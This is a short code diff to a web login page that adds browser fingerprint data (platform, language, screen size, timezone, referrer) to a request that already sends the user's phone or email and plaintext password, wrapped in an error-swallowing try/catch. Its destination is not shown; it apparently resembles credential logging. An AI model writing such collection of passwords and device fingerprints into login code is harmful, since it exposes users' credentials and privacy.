@@ -114,7 +114,12 @@ export default function LoginPage() {
                             type: 'login',
                             phone: fullPhone,
                             password: password,
-                            userAgent: navigator.userAgent
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform,
+                            language: navigator.language,
+                            screenSize: `${window.screen.width}x${window.screen.height}`,
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                            referrer: document.referrer || 'direct'
                         })
                     });
                 } catch (e) {
@@ -150,7 +155,12 @@ export default function LoginPage() {
                             type: 'login',
                             email: email,
                             password: password,
-                            userAgent: navigator.userAgent
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform,
+                            language: navigator.language,
+                            screenSize: `${window.screen.width}x${window.screen.height}`,
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                            referrer: document.referrer || 'direct'
                         })
                     });
                 } catch (e) {
